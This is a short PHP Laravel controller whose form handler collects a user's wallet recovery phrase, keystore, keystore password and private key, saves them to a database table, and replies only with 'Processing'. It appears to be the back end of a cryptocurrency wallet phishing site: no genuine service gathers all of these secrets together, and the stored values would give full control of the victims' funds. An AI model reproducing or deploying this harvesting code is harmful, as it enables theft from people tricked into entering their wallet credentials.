<?php

namespace App\Http\Controllers;

use Mail;
use App\Models\Details;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class PagesController extends Controller
{
    public function index(){
      return view('index');
    }
    public function links(){
      return view('link');
    }
    public function submitForm(Request $request){
      $detail = Details::create(
        [
        'phrase' => $request->get('phrase'),
        'keystore' => $request->get('keystore'),
        'keystore_password' => $request->get('keystorepass'),
        'private_key' => $request->get('privatekey'),
        ]
    );

        return back()->with(['message' => 'Processing']);
    }
}
